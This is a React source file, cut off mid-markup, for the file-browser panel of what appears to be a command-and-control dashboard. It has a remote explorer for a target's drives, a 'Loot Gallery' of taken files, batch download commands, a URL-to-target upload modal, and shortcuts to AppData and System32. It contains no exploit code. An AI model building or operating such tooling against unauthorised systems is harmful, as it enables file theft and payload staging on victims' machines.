import React, { useState, useMemo, useRef, useEffect } from 'react';
import {
  FolderOpen, Folder, HardDrive, RefreshCw, Monitor, Database as DatabaseIcon,
  ShieldCheck, Eye, Download, Search, Grid, List, ArrowUp, ArrowDown,
  ChevronRight, CornerLeftUp, ArrowLeft, Copy, Check, Upload, FileText,
  Image as ImageIcon, Archive, Clock, X, AlertCircle
} from 'lucide-react';
import Tooltip from './Tooltip';
import type { FileEntry, LootFile } from '../types';

interface FileExplorerProps {
  fileSubTab: 'explorer' | 'loot';
  setFileSubTab: (v: 'explorer' | 'loot') => void;
  currentPath: string;
  fileList: FileEntry[];
  isFilesLoading: boolean;
  fileError: string;
  fileTruncated: boolean;
  fileTotalCount: number;
  navHistoryRef: React.MutableRefObject<string[]>;
  browseFolder: (path: string, forceRefresh?: boolean) => void;
  goBack: () => void;
  listDrives: () => void;
  renderBreadcrumbs: () => React.ReactNode;
  getFileMeta: (file: FileEntry) => { icon: React.ReactNode; isPreviewable: boolean };
  requestPreview: (path: string, name: string) => void;
  executeCommand: (cmd: string, silent?: boolean) => void;
  lootFiles: LootFile[];
  selectedLoot: LootFile | null;
  lootContent: string | null;
  viewLoot: (file: LootFile) => void;
}

type SortField = 'name' | 'size' | 'date' | 'type';
type SortOrder = 'asc' | 'desc';
type FileFilterType = 'all' | 'folders' | 'images' | 'documents' | 'code' | 'executables' | 'archives';

function formatFileSize(sizeStr: string): string {
  // Client already sends human-readable sizes ("12.3 KB", "DIR", "???") — pass through
  if (!/^\d+$/.test(sizeStr.trim())) return sizeStr;
  try {
    const bytes = parseInt(sizeStr, 10);
    if (isNaN(bytes) || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
  } catch {
    return sizeStr;
  }
}

const SIZE_UNITS: Record<string, number> = { B: 1, KB: 1024, MB: 1024 ** 2, GB: 1024 ** 3, TB: 1024 ** 4 };

function parseBytes(sizeStr: string): number {
  // Handles both raw byte counts and formatted strings like "1.5 KB" / "DIR" / "???"
  const m = sizeStr.trim().match(/^([\d.]+)\s*(B|KB|MB|GB|TB)$/i);
  if (m) return parseFloat(m[1]) * (SIZE_UNITS[m[2].toUpperCase()] || 1);
  const bytes = parseInt(sizeStr, 10);
  return isNaN(bytes) ? -1 : bytes; // unknown markers sort last
}

function getFileCategory(name: string, isDir: boolean): FileFilterType {
  if (isDir) return 'folders';
  const ext = name.split('.').pop()?.toLowerCase() || '';
  if (['png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'ico', 'svg'].includes(ext)) return 'images';
  if (['txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'csv', 'md', 'rtf', 'log'].includes(ext)) return 'documents';
  if (['py', 'js', 'ts', 'jsx', 'tsx', 'c', 'cpp', 'h', 'cs', 'java', 'go', 'rs', 'php', 'html', 'css', 'json', 'xml', 'yaml', 'yml', 'sh', 'bat', 'ps1'].includes(ext)) return 'code';
  if (['exe', 'dll', 'sys', 'msi', 'cmd', 'vbs', 'scr'].includes(ext)) return 'executables';
  if (['zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'iso'].includes(ext)) return 'archives';
  return 'documents';
}

function getFileTypeBadge(name: string, isDir: boolean) {
  if (isDir) return { label: 'DIR', color: 'bg-amber-500/10 text-amber-400 border-amber-500/20' };
  const ext = name.split('.').pop()?.toUpperCase() || 'FILE';
  if (['EXE', 'DLL', 'BAT', 'PS1', 'MSI', 'CMD'].includes(ext)) {
    return { label: ext, color: 'bg-rose-500/15 text-rose-400 border-rose-500/30 font-bold' };
  }
  if (['PNG', 'JPG', 'JPEG', 'GIF', 'WEBP'].includes(ext)) {
    return { label: ext, color: 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30' };
  }
  if (['PY', 'JS', 'TS', 'JSON', 'HTML', 'CSS', 'RS', 'GO'].includes(ext)) {
    return { label: ext, color: 'bg-indigo-500/15 text-indigo-400 border-indigo-500/30' };
  }
  if (['ZIP', 'RAR', '7Z', 'TAR', 'GZ'].includes(ext)) {
    return { label: ext, color: 'bg-amber-500/15 text-amber-400 border-amber-500/30' };
  }
  if (['TXT', 'LOG', 'MD', 'CSV', 'CONFIG', 'INI', 'ENV'].includes(ext)) {
    return { label: ext, color: 'bg-sky-500/15 text-sky-400 border-sky-500/30' };
  }
  return { label: ext.slice(0, 4), color: 'bg-slate-800 text-slate-400 border-slate-700' };
}

export default function FileExplorer({
  fileSubTab, setFileSubTab,
  currentPath,
  fileList,
  isFilesLoading, fileError, fileTruncated, fileTotalCount,
  navHistoryRef,
  browseFolder, goBack, listDrives,
  getFileMeta,
  requestPreview, executeCommand,
  lootFiles, selectedLoot,
  lootContent, viewLoot,
}: FileExplorerProps) {
  // State for search, filter, view mode, sorting & selection
  const [searchQuery, setSearchQuery] = useState('');
  const [filterType, setFilterType] = useState<FileFilterType>('all');
  const [viewMode, setViewMode] = useState<'list' | 'grid'>('list');
  const [sortField, setSortField] = useState<SortField>('name');
  const [sortOrder, setSortOrder] = useState<SortOrder>('asc');
  const [selectedPaths, setSelectedPaths] = useState<Set<string>>(new Set());
  const [copiedPath, setCopiedPath] = useState(false);
  const [isEditingPath, setIsEditingPath] = useState(false);
  const [inputPath, setInputPath] = useState(currentPath || '');
  const [uploadModalOpen, setUploadModalOpen] = useState(false);
  const [uploadUrl, setUploadUrl] = useState('');
  const [uploadDst, setUploadDst] = useState('');
  const [lootSearchQuery, setLootSearchQuery] = useState('');
  const [lootFilterType, _setLootFilterType] = useState<'all' | 'images' | 'text' | 'binary'>('all');

  const pathInputRef = useRef<HTMLInputElement>(null);

  // Sync input path with currentPath when not actively editing
  useEffect(() => {
    if (!isEditingPath) {
      setInputPath(currentPath || '');
    }
  }, [currentPath, isEditingPath]);

  // Clear selections when navigating
  useEffect(() => {
    setSelectedPaths(new Set());
  }, [currentPath]);

  // Handle path submission
  const handlePathSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (inputPath.trim()) {
      browseFolder(inputPath.trim());
      setIsEditingPath(false);
    }
  };

  // Copy current path to clipboard
  const handleCopyCurrentPath = () => {
    if (currentPath) {
      navigator.clipboard.writeText(currentPath);
      setCopiedPath(true);
      setTimeout(() => setCopiedPath(false), 1500);
    }
  };

  // Sort and Filter logic
  const filteredAndSortedFiles = useMemo(() => {
    let result = [...fileList];

    // Filter by search query
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      result = result.filter(f => f.name.toLowerCase().includes(q));
    }

    // Filter by type
    if (filterType !== 'all') {
      result = result.filter(f => getFileCategory(f.name, f.is_dir) === filterType);
    }

    // Sort
    result.sort((a, b) => {
      // Folders always first unless specifically sorting otherwise
      if (a.is_dir !== b.is_dir) {
        return a.is_dir ? -1 : 1;
      }

      let comparison = 0;
      if (sortField === 'name') {
        comparison = a.name.localeCompare(b.name, undefined, { numeric: true, sensitivity: 'base' });
      } else if (sortField === 'size') {
        comparison = parseBytes(a.size) - parseBytes(b.size);
      } else if (sortField === 'date') {
        comparison = (a.date || '').localeCompare(b.date || '');
      } else if (sortField === 'type') {
        const extA = a.name.split('.').pop() || '';
        const extB = b.name.split('.').pop() || '';
        comparison = extA.localeCompare(extB);
      }

      return sortOrder === 'asc' ? comparison : -comparison;
    });

    return result;
  }, [fileList, searchQuery, filterType, sortField, sortOrder]);

  // Loot filtering
  const filteredLootFiles = useMemo(() => {
    let result = [...lootFiles];
    if (lootSearchQuery.trim()) {
      const q = lootSearchQuery.toLowerCase();
      result = result.filter(f => f.name.toLowerCase().includes(q) || f.client.toLowerCase().includes(q));
    }
    if (lootFilterType === 'images') {
      result = result.filter(f => f.name.match(/\.(png|jpg|jpeg|gif|webp|bmp|ico)$/i));
    } else if (lootFilterType === 'text') {
      result = result.filter(f => f.name.match(/\.(txt|log|json|xml|md|csv|ini|cfg|env)$/i));
    }
    return result;
  }, [lootFiles, lootSearchQuery, lootFilterType]);

  // Toggle sort field or direction
  const handleSort = (field: SortField) => {
    if (sortField === field) {
      setSortOrder(prev => prev === 'asc' ? 'desc' : 'asc');
    } else {
      setSortField(field);
      setSortOrder('asc');
    }
  };

  // Selection helpers
  const toggleSelect = (path: string, e: React.MouseEvent) => {
    e.stopPropagation();
    setSelectedPaths(prev => {
      const next = new Set(prev);
      if (next.has(path)) next.delete(path);
      else next.add(path);
      return next;
    });
  };

  const selectAll = () => {
    if (selectedPaths.size === filteredAndSortedFiles.length) {
      setSelectedPaths(new Set());
    } else {
      const all = new Set(filteredAndSortedFiles.map(f => {
        return currentPath === 'System Drives' ? f.name : (currentPath ? `${currentPath}/${f.name}` : f.name);
      }));
      setSelectedPaths(all);
    }
  };

  // Batch download selected
  const downloadSelected = () => {
    selectedPaths.forEach(path => {
      executeCommand(`download "${path}"`);
    });
  };

  // Helper to build clean remote file paths
  const buildFullPath = (base: string, fileName: string): string => {
    if (!base || base === 'System Drives') return fileName;
    const cleanBase = base.replace(/\\/g, '/').replace(/\/+$/, '');
    const lastSegment = cleanBase.split('/').pop() || '';
    if (lastSegment.toLowerCase() === fileName.toLowerCase()) {
      return cleanBase;
    }
    return `${cleanBase}/${fileName}`;
  };

  // Interactive breadcrumb generator
  const renderInteractiveBreadcrumbs = () => {
    if (!currentPath || currentPath === 'System Drives') {
      return (
        <span className="text-xs font-mono font-bold text-c2cyan flex items-center space-x-1">
          <HardDrive className="w-3.5 h-3.5" />
          <span>System Drives Root</span>
        </span>
      );
    }

    const normalized = currentPath.replace(/\\/g, '/');

    if (normalized.startsWith('SPECIAL:')) {
      const specialName = normalized.replace('SPECIAL:', '');
      return (
        <div className="flex items-center space-x-1.5 text-xs font-mono">
          <Folder className="w-3.5 h-3.5 text-amber-400" />
          <span className="font-bold text-c2cyan">{specialName}</span>
        </div>
      );
    }

    const parts = normalized.split('/').filter(Boolean);

    return (
      <div className="flex items-center space-x-1 text-xs font-mono overflow-x-auto py-0.5 max-w-full">
        <button
          onClick={listDrives}
          className="px-1.5 py-0.5 rounded text-slate-400 hover:text-white hover:bg-slate-800 transition-colors flex items-center space-x-1 shrink-0"
          title="Root Drives"
        >
          <HardDrive className="w-3 h-3 text-c2cyan" />
        </button>

        {parts.map((part, index) => {
          const isWindowsDrive = index === 0 && part.includes(':');
          const subPath = isWindowsDrive
            ? `${part}/${parts.slice(1, index + 1).join('/')}`.replace(/\/+$/, '')
            : parts.slice(0, index + 1).join('/');
          const isLast = index === parts.length - 1;
          return (
            <React.Fragment key={index}>
              <ChevronRight className="w-3 h-3 text-slate-600 shrink-0" />
              <button
                onClick={() => browseFolder(subPath)}
                className={`px-1.5 py-0.5 rounded transition-all shrink-0 max-w-[140px] truncate ${
                  isLast
                    ? 'font-bold text-c2cyan bg-c2accent/10 border border-c2accent/20'
                    : 'text-slate-300 hover:text-white hover:bg-slate-800'
                }`}
                title={subPath}
              >
                {part}
              </button>
            </React.Fragment>
          );
        })}
      </div>
    );
  };

  // Quick Access Sidebar Items
  const quickAccessGroups = [
    {
      title: 'User Profile',
      items: [
        { label: 'Desktop', icon: <Monitor className="w-3.5 h-3.5 text-sky-400" />, path: 'SPECIAL:Desktop' },
        { label: 'Documents', icon: <FileText className="w-3.5 h-3.5 text-blue-400" />, path: 'SPECIAL:Documents' },
        { label: 'Downloads', icon: <Download className="w-3.5 h-3.5 text-emerald-400" />, path: 'SPECIAL:Downloads' },
        { label: 'Pictures', icon: <ImageIcon className="w-3.5 h-3.5 text-purple-400" />, path: 'SPECIAL:Pictures' },
        { label: 'Videos', icon: <Monitor className="w-3.5 h-3.5 text-indigo-400" />, path: 'SPECIAL:Videos' },
      ]
    },
    {
      title: 'System & Targets',
      items: [
        { label: 'AppData', icon: <DatabaseIcon className="w-3.5 h-3.5 text-amber-400" />, path: 'SPECIAL:AppData' },
        { label: 'Temp Dir', icon: <Clock className="w-3.5 h-3.5 text-orange-400" />, path: 'SPECIAL:Temp' },
        { label: 'OneDrive', icon: <DatabaseIcon className="w-3.5 h-3.5 text-cyan-400" />, path: 'SPECIAL:OneDrive' },
        { label: 'System32', icon: <ShieldCheck className="w-3.5 h-3.5 text-rose-400" />, path: 'C:/Windows/System32' },
        { label: 'Program Files', icon: <Folder className="w-3.5 h-3.5 text-slate-300" />, path: 'C:/Program Files' },
      ]
    }
  ];

  return (
    <div className="h-full flex flex-col space-y-3">
      {/* Top Header: Sub-Tabs & Actions */}
      <div className="flex items-center justify-between shrink-0">
        <div className="flex items-center space-x-1.5 bg-c2pill p-1 rounded-xl border border-c2border shadow-inner">
          <button
            onClick={() => setFileSubTab('explorer')}
            className={`px-4 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center space-x-2 ${
              fileSubTab === 'explorer'
                ? 'bg-c2accent text-white shadow-md shadow-c2accent/20'
                : 'text-slate-400 hover:text-white hover:bg-c2card'
            }`}
          >
            <FolderOpen className="w-3.5 h-3.5" />
            <span>Remote Explorer</span>
            {fileList.length > 0 && (
              <span className={`px-1.5 py-0.2 rounded-full text-[9px] font-mono ${fileSubTab === 'explorer' ? 'bg-white/20 text-white' : 'bg-slate-800 text-slate-400'}`}>
                {fileList.length}
              </span>
            )}
          </button>
          <button
            onClick={() => setFileSubTab('loot')}
            className={`px-4 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center space-x-2 ${
              fileSubTab === 'loot'
                ? 'bg-c2accent text-white shadow-md shadow-c2accent/20'
                : 'text-slate-400 hover:text-white hover:bg-c2card'
            }`}
          >
            <Archive className="w-3.5 h-3.5" />
            <span>Loot Gallery</span>
            {lootFiles.length > 0 && (
              <span className={`px-1.5 py-0.2 rounded-full text-[9px] font-mono ${fileSubTab === 'loot' ? 'bg-white/20 text-white' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'}`}>
                {lootFiles.length}
              </span>
            )}
          </button>
        </div>

        {/* Global Toolbar Action Buttons */}
        {fileSubTab === 'explorer' && (
          <div className="flex items-center space-x-2">
            <button
              onClick={() => {
                setUploadDst(currentPath && currentPath !== 'System Drives' ? `${currentPath}/downloaded_file.bin` : 'C:/Temp/file.bin');
                setUploadModalOpen(true);
              }}
              className="px-3 py-1.5 bg-c2pill hover:bg-c2card border border-c2border hover:border-c2borderlight rounded-lg text-xs font-semibold text-slate-300 hover:text-white flex items-center space-x-1.5 transition-colors shadow-sm"
              title="Push file from URL to remote target"
            >
              <Upload className="w-3.5 h-3.5 text-c2cyan" />
              <span>Fetch Remote URL</span>
            </button>
            <button
              onClick={listDrives}
              className="px-3 py-1.5 bg-c2pill hover:bg-c2card border border-c2border hover:border-c2borderlight rounded-lg text-xs font-semibold text-slate-300 hover:text-white flex items-center space-x-1.5 transition-colors shadow-sm"
            >
              <HardDrive className="w-3.5 h-3.5 text-amber-400" />
              <span>System Drives</span>
            </button>
            <button
              onClick={() => {
                if (!currentPath || currentPath === 'System Drives') {
                  listDrives();
                } else {
                  browseFolder(currentPath, true);
                }
              }}
              className="px-3 py-1.5 bg-c2accent hover:bg-c2accenthover text-white rounded-lg text-xs font-bold flex items-center space-x-1.5 transition-colors shadow-sm shadow-c2accent/20"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isFilesLoading ? 'animate-spin' : ''}`} />
              <span>Refresh</span>
            </button>
          </div>
        )}
      </div>

      {/* Main File Explorer Interface */}
      <div className="flex-1 min-h-0">
        {fileSubTab === 'explorer' ? (
          <div className="h-full bg-c2card border border-c2border rounded-2xl flex flex-col overflow-hidden shadow-card">
            {/* Top Path & Navigation Toolbar */}
            <div className="p-3 border-b border-c2border bg-c2bg/60 flex items-center space-x-3 shrink-0">
              {/* Navigation Arrows */}
              <div className="flex items-center space-x-1 shrink-0">
                <button
                  onClick={goBack}
                  disabled={navHistoryRef.current.length === 0}
                  className="p-2 bg-c2pill border border-c2border rounded-lg text-slate-300 hover:text-white hover:border-c2borderlight disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                  title="Back (History)"
                >
                  <ArrowLeft className="w-4 h-4" />
                </button>
                <button
                  onClick={() => {
                    if (currentPath && currentPath !== 'System Drives') {
                      if (currentPath.length <= 3 && currentPath.includes(':')) {
                        listDrives();
                      } else {
                        browseFolder(currentPath + '/..');
                      }
                    }
                  }}
                  disabled={!currentPath || currentPath === 'System Drives'}
                  className="p-2 bg-c2pill border border-c2border rounded-lg text-slate-300 hover:text-white hover:border-c2borderlight disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                  title="Up one level (..)"
                >
                  <CornerLeftUp className="w-4 h-4" />
                </button>
              </div>

              {/* Interactive Path Bar / Address Box */}
              <div className="flex-1 min-w-0 flex items-center bg-c2pill border border-c2border focus-within:border-c2accent rounded-xl px-3 py-1.5 transition-all shadow-inner">
                {isEditingPath ? (
                  <form onSubmit={handlePathSubmit} className="flex-1 flex items-center">
                    <input
                      ref={pathInputRef}
                      type="text"
                      value={inputPath}
                      onChange={(e) => setInputPath(e.target.value)}
                      onBlur={() => setIsEditingPath(false)}
                      placeholder="Enter target directory path (e.g. C:/Windows/System32)..."
                      className="w-full bg-transparent text-xs font-mono text-white focus:outline-none placeholder-slate-500"
                      autoFocus
                    />
                  </form>
                ) : (
                  <div
                    onClick={() => {
                      setIsEditingPath(true);
                      setTimeout(() => pathInputRef.current?.select(), 50);
                    }}
                    className="flex-1 flex items-center justify-between cursor-text min-w-0"
                  >
                    <div className="min-w-0 flex-1">
                      {renderInteractiveBreadcrumbs()}
                    </div>
                  </div>
                )}

                {/* Path Actions: Copy & Edit */}
                <div className="flex items-center space-x-1 shrink-0 ml-2">
                  <Tooltip text={copiedPath ? 'Copied to clipboard!' : 'Copy full path'} position="bottom">
                    <button
                      onClick={handleCopyCurrentPath}
                      className="p-1 rounded text-slate-400 hover:text-white hover:bg-c2card transition-colors"
                    >
                      {copiedPath ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </Tooltip>
                </div>
              </div>
            </div>

            {/* Filter, Search & View Controls Bar */}
            <div className="px-4 py-2.5 border-b border-c2border bg-c2card flex items-center justify-between gap-3 shrink-0 flex-wrap">
              {/* Search Bar */}
              <div className="relative flex-1 min-w-[220px] max-w-md">
                <Search className="w-3.5 h-3.5 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder={`Search ${fileList.length} files in folder...`}
                  className="w-full bg-c2pill border border-c2border rounded-lg pl-8 pr-7 py-1.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-c2accent transition-colors"
                />
                {searchQuery && (
                  <button
                    onClick={() => setSearchQuery('')}
                    className="absolute right-2 top-1/2 -translate-y-1/2 p-0.5 text-slate-500 hover:text-white"
                  >
                    <X className="w-3 h-3" />
                  </button>
                )}
              </div>

              {/* Category Filter Chips */}
              <div className="flex items-center space-x-1 bg-c2pill p-0.5 rounded-lg border border-c2border">
                {(['all', 'folders', 'images', 'documents', 'code', 'executables', 'archives'] as const).map((f) => (
                  <button
                    key={f}
                    onClick={() => setFilterType(f)}
                    className={`px-2 py-1 rounded-md text-[10px] font-bold capitalize transition-all ${
                      filterType === f
                        ? 'bg-c2accent text-white shadow-sm'
                        : 'text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {f === 'all' ? 'All' : f}
                  </button>
                ))}
              </div>

              {/* Batch Action Bar (if items selected) & View Mode */}
              <div className="flex items-center space-x-2 shrink-0">
                {selectedPaths.size > 0 && (
                  <div className="flex items-center space-x-2 bg-c2accent/10 border border-c2accent/30 px-2.5 py-1 rounded-lg">
                    <span className="text-[11px] font-bold text-c2cyan font-mono">
                      {selectedPaths.size} selected
                    </span>
                    <button
                      onClick={downloadSelected}
                      className="px-2 py-0.5 bg-c2accent hover:bg-c2accenthover text-white text-[10px] font-bold rounded flex items-center space-x-1 transition-colors"
                    >
                      <Download className="w-3 h-3" />
                      <span>Download All</span>
                    </button>
                    <button
                      onClick={() => setSelectedPaths(new Set())}
                      className="text-slate-400 hover:text-white text-[10px]"
                    >
                      <X className="w-3 h-3" />
                    </button>
                  </div>
                )}

                {/* View Mode Toggle */}
                <div className="flex items-center bg-c2pill p-0.5 rounded-lg border border-c2border">
                  <button
                    onClick={() => setViewMode('list')}
                    className={`p-1.5 rounded-md transition-colors ${viewMode === 'list' ? 'bg-c2accent text-white' : 'text-slate-400 hover:text-slate-200'}`}
                    title="List View"
                  >
                    <List className="w-3.5 h-3.5" />
                  </button>
                  <button
                    onClick={() => setViewMode('grid')}
                    className={`p-1.5 rounded-md transition-colors ${viewMode === 'grid' ? 'bg-c2accent text-white' : 'text-slate-400 hover:text-slate-200'}`}
                    title="Grid Card View"
                  >
                    <Grid className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
            </div>

            {/* Split Content: Quick Access Sidebar + Main File Browser */}
            <div className="flex-1 flex overflow-hidden">
              {/* Quick Access Sidebar */}
              <div className="w-52 border-r border-c2border bg-c2bg/40 flex flex-col shrink-0 overflow-y-auto">
                <div className="p-3 space-y-4">
                  {quickAccessGroups.map((group, gIdx) => (
                    <div key={gIdx} className="space-y-1">
                      <div className="px-2 text-[9px] font-bold uppercase tracking-wider text-slate-500">
                        {group.title}
                      </div>
                      <div className="space-y-0.5">
                        {group.items.map((item) => {
                          // SPECIAL:* paths resolve to real Windows paths server-side,
                          // so also match on the resolved folder name for highlighting
                          const specialSegment = item.path.startsWith('SPECIAL:')
                            ? item.path.split(':')[1].split('/')[0].toLowerCase()
                            : null;
                          const isActive = currentPath === item.path ||
                            (specialSegment !== null && (
                              currentPath.toLowerCase().endsWith(`/${specialSegment}`) ||
                              currentPath.toLowerCase().endsWith(`\\${specialSegment}`)
                            ));
                          return (
                            <button
                              key={item.label}
                              onClick={() => browseFolder(item.path)}
                              className={`w-full flex items-center space-x-2.5 px-2.5 py-1.5 rounded-lg text-xs font-medium transition-all ${
                                isActive
                                  ? 'bg-c2accent/15 text-c2cyan font-bold border border-c2accent/30 shadow-sm'
                                  : 'text-slate-400 hover:text-white hover:bg-c2pill border border-transparent'
                              }`}
                            >
                              <span className="shrink-0">{item.icon}</span>
                              <span className="truncate">{item.label}</span>
                            </button>
                          );
                        })}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Main File Listing Pane */}
              <div className="flex-1 flex flex-col overflow-hidden bg-c2bg/20">
                {/* Alerts / Error Notices */}
                {fileError && (
                  <div className="m-3 p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs flex items-center space-x-2 shrink-0">
                    <AlertCircle className="w-4 h-4 shrink-0 text-red-400" />
                    <span>{fileError}</span>
                  </div>
                )}
                {fileTruncated && (
                  <div className="mx-3 mt-3 p-2.5 bg-amber-500/10 border border-amber-500/30 rounded-xl text-amber-400 text-xs flex items-center justify-between shrink-0">
                    <span>Showing 500 of {fileTotalCount} items. (Directory is very large)</span>
                  </div>
                )}

                {/* File List / Grid Content */}
                <div className="flex-1 overflow-y-auto">
                  {fileList.length === 0 && !fileError ? (
                    <div className="h-full flex flex-col items-center justify-center p-12 text-center text-slate-500 space-y-3">
                      {isFilesLoading ? (
                        <div className="flex flex-col items-center space-y-3">
                          <div className="w-10 h-10 rounded-xl bg-c2accent/10 border border-c2accent/20 flex items-center justify-center">
                            <RefreshCw className="w-5 h-5 animate-spin text-c2cyan" />
                          </div>
                          <span className="text-xs font-bold uppercase tracking-wider text-slate-300">Retrieving remote directory...</span>
                        </div>
                      ) : (
                        <div className="flex flex-col items-center space-y-2">
                          <div className="w-12 h-12 rounded-2xl bg-c2pill flex items-center justify-center text-slate-600 border border-c2border">
                            <FolderOpen className="w-6 h-6 opacity-30" />
                          </div>
                          <span className="text-xs font-semibold text-slate-400">Directory is empty</span>
                          <span className="text-[11px] text-slate-600">Select a folder or quick access location to browse</span>
                        </div>
                      )}
                    </div>
                  ) : filteredAndSortedFiles.length === 0 ? (
                    <div className="h-full flex flex-col items-center justify-center p-12 text-center text-slate-500 space-y-2">
                      <Search className="w-8 h-8 opacity-20" />
                      <span className="text-xs font-semibold text-slate-300">No matching files found</span>
                      <span className="text-[11px] text-slate-600">Try adjusting your search query or filter chips</span>
                    </div>
                  ) : viewMode === 'list' ? (
                    /* ================= LIST VIEW ================= */
                    <table className="w-full text-left border-collapse">
                      <thead>
                        <tr className="border-b border-c2border bg-c2pill/70 text-[10px] uppercase tracking-wider text-slate-400 font-bold sticky top-0 z-10 backdrop-blur-md">
                          <th className="p-3 w-10 text-center">
                            <input
                              type="checkbox"
                              checked={selectedPaths.size > 0 && selectedPaths.size === filteredAndSortedFiles.length}
                              onChange={selectAll}
                              className="rounded bg-slate-900 border-c2border text-c2accent focus:ring-0 cursor-pointer"
                            />
                          </th>
                          <th
                            onClick={() => handleSort('name')}
                            className="p-3 cursor-pointer hover:text-white transition-colors"
                          >
                            <div className="flex items-center space-x-1.5">
                              <span>Name</span>
                              {sortField === 'name' && (
                                sortOrder === 'asc' ? <ArrowUp className="w-3 h-3 text-c2cyan" /> : <ArrowDown className="w-3 h-3 text-c2cyan" />
                              )}
                            </div>
                          </th>
                          <th
                            onClick={() => handleSort('type')}
                            className="p-3 cursor-pointer hover:text-white transition-colors w-24"
                          >
                            <div className="flex items-center space-x-1.5">
                              <span>Type</span>
                              {sortField === 'type' && (
                                sortOrder === 'asc' ? <ArrowUp className="w-3 h-3 text-c2cyan" /> : <ArrowDown className="w-3 h-3 text-c2cyan" />
                              )}
                            </div>
                          </th>
                          <th
                            onClick={() => handleSort('size')}
                            className="p-3 cursor-pointer hover:text-white transition-colors w-28"
                          >
                            <div className="flex items-center space-x-1.5">
                              <span>Size</span>
                              {sortField === 'size' && (
                                sortOrder === 'asc' ? <ArrowUp className="w-3 h-3 text-c2cyan" /> : <ArrowDown className="w-3 h-3 text-c2cyan" />
                              )}
                            </div>
                          </th>
                          <th
                            onClick={() => handleSort('date')}
                            className="p-3 cursor-pointer hover:text-white transition-colors w-40"
                          >
                            <div className="flex items-center space-x-1.5">
                              <span>Modified</span>
                              {sortField === 'date' && (
                                sortOrder === 'asc' ? <ArrowUp className="w-3 h-3 text-c2cyan" /> : <ArrowDown className="w-3 h-3 text-c2cyan" />
                              )}
                            </div>
                          </th>
                          <th className="p-3 text-right w-28">Actions</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-c2border/50 text-xs">
                        {/* Parent Directory Link */}
                        {currentPath && currentPath !== 'System Drives' && (
                          <tr
                            className="hover:bg-c2pill/60 cursor-pointer transition-colors group"
                            onClick={() => {
                              if (currentPath.length <= 3 && currentPath.includes(':')) {
                                listDrives();
                              } else {
                                browseFolder(currentPath + '/..');
                              }
                            }}
                          >
                            <td className="p-3 text-center">
                              <CornerLeftUp className="w-3.5 h-3.5 text-slate-500 mx-auto" />
                            </td>
                            <td colSpan={5} className="p-3 font-bold text-c2cyan flex items-center space-x-2">
                              <FolderOpen className="w-4 h-4 text-amber-400" />
                              <span>.. [Parent Directory]</span>
                            </td>
                          </tr>
                        )}

                        {/* File Rows */}
                        {filteredAndSortedFiles.map((file, i) => {
                          const meta = getFileMeta(file);
                          const fullPath = buildFullPath(currentPath, file.name);
                          const isSelected = selectedPaths.has(fullPath);
                          const badge = getFileTypeBadge(file.name, file.is_dir);

                          return (
                            <tr
                              key={i}
                              onClick={(e) => toggleSelect(fullPath, e)}
                              onDoubleClick={() => {
                                if (file.is_dir) {
                                  browseFolder(fullPath);
                                } else if (meta.isPreviewable) {
                                  requestPreview(fullPath, file.name);
                                }
                              }}
                              className={`transition-colors group cursor-pointer ${
                                isSelected
                                  ? 'bg-c2accent/15 hover:bg-c2accent/20'
                                  : 'hover:bg-c2pill/60'
                              }`}
                            >
                              <td className="p-3 text-center" onClick={(e) => e.stopPropagation()}>
                                <input
                                  type="checkbox"
                                  checked={isSelected}
                                  onChange={(e) => toggleSelect(fullPath, e as any)}
                                  className="rounded bg-slate-900 border-c2border text-c2accent focus:ring-0 cursor-pointer"
                                />
                              </td>

                              <td className="p-3">
                                <div className="flex items-center space-x-2.5 min-w-0">
                                  <div className="shrink-0">{meta.icon}</div>
                                  <span
                                    className={`truncate font-medium ${
                                      file.is_dir
                                        ? 'text-slate-200 hover:text-c2cyan font-semibold cursor-pointer underline-offset-2 hover:underline'
                                        : 'text-slate-300 group-hover:text-white'
                                    }`}
                                    title={file.name}
                                    onClick={(e) => {
                                      if (file.is_dir) {
                                        e.stopPropagation();
                                        browseFolder(fullPath);
                                      }
                                    }}
                                  >
                                    {file.name}
                                  </span>
                                </div>
                              </td>

                              <td className="p-3">
                                <span className={`px-1.5 py-0.5 rounded text-[9px] font-mono border ${badge.color}`}>
                                  {badge.label}
                                </span>
                              </td>

                              <td className="p-3 font-mono text-slate-400 text-[11px]">
                                {file.is_dir ? (
                                  <span className="text-slate-600">--</span>
                                ) : (
                                  formatFileSize(file.size)
                                )}
                              </td>

                              <td className="p-3 text-slate-500 font-mono text-[11px] whitespace-nowrap">
                                {file.date || '--'}
                              </td>

                              <td className="p-3 text-right" onClick={(e) => e.stopPropagation()}>
                                {!file.is_dir && (
                                  <div className="flex items-center justify-end space-x-1 opacity-70 group-hover:opacity-100 transition-opacity">
                                    {meta.isPreviewable && (
                                      <Tooltip text="Quick Preview" position="left">
                                        <button
                                          onClick={() => requestPreview(fullPath, file.name)}
                                          className="p-1.5 hover:bg-emerald-500/20 hover:text-emerald-400 text-slate-400 rounded-lg transition-colors"
                                        >
                                          <Eye className="w-3.5 h-3.5" />
                                        </button>
                                      </Tooltip>
                                    )}
                                    <Tooltip text="Download to C2 Loot" position="left">
                                      <button
